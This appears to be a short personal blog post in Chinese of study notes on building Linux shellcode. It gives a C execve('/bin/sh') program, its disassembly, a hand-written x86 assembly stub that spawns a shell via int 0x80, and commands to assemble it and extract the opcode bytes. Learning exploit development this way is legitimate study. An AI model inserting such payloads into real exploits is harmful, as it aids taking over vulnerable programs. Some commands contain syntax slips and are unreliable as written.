---
layout: default
title: shellcode_notes
categories:
- C++
tags:
- C++
---
//Description: how to write shellcode

//Create Date: 2020-04-15 15:43:04

//Author: channy

# shellcode_notes

## 1. 写源码

```c++
//shellcode.c
#include <stdio.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
	char *buf[] = {"/bin/sh",NULL};
        execve("/bin/sh", buf, 0);
        return 0;
}
```

## 2. 反编译

```
gcc -o shellcode shellcode.c 
objdump -d shellcode > shellcode.s
```

## 3. 关注反编译中main部分

```
00000000000006aa <main>:
 6aa:   55                      push   %rbp
 6ab:   48 89 e5                mov    %rsp,%rbp
 6ae:   48 83 ec 30             sub    $0x30,%rsp
 6b2:   89 7d dc                mov    %edi,-0x24(%rbp)
 6b5:   48 89 75 d0             mov    %rsi,-0x30(%rbp)
 6b9:   64 48 8b 04 25 28 00    mov    %fs:0x28,%rax
 6c0:   00 00  
 6c2:   48 89 45 f8             mov    %rax,-0x8(%rbp)
 6c6:   31 c0                   xor    %eax,%eax
 6c8:   48 8d 05 c5 00 00 00    lea    0xc5(%rip),%rax        # 794 <_IO_stdin_used+0x4>
 6cf:   48 89 45 e0             mov    %rax,-0x20(%rbp)
 6d3:   48 c7 45 e8 00 00 00    movq   $0x0,-0x18(%rbp)
 6da:   00  
 6db:   48 8b 45 e0             mov    -0x20(%rbp),%rax
 6df:   48 8d 4d e0             lea    -0x20(%rbp),%rcx
 6e3:   ba 00 00 00 00          mov    $0x0,%edx
 6e8:   48 89 ce                mov    %rcx,%rsi
 6eb:   48 89 c7                mov    %rax,%rdi
 6ee:   e8 8d fe ff ff          callq  580 <execve@plt>
 6f3:   b8 00 00 00 00          mov    $0x0,%eax
 6f8:   48 8b 55 f8             mov    -0x8(%rbp),%rdx
 6fc:   64 48 33 14 25 28 00    xor    %fs:0x28,%rdx
 703:   00 00  
 705:   74 05                   je     70c <main+0x62>
 707:   e8 64 fe ff ff          callq  570 <__stack_chk_fail@plt>
 70c:   c9                      leaveq 
 70d:   c3                      retq   
 70e:   66 90                   xchg   %ax,%ax
```

## 4. 重写汇编

```
//scode.s
.section .text
.global _start
_start:
xor eax,eax;
push eax    ;
push 0x68732f6e
push 0x69622f2f ;
mov ebx,esp;
push eax
mov edx,esp;
push ebx
mov ecx,esp
mov al,11
int 0x80;

.ascii "/bin/sh"
```

## 5. 编译和连接

```
as -o scode.o scode.s
ld -o scode scode.o
```

objdump反汇编scode，提取shellcode

```
for i in $(objdump -d scode | grep “^ ” |cut -f2); do echo -n ‘\x’$i; done;
```

最后得到shellcode

[back](/)

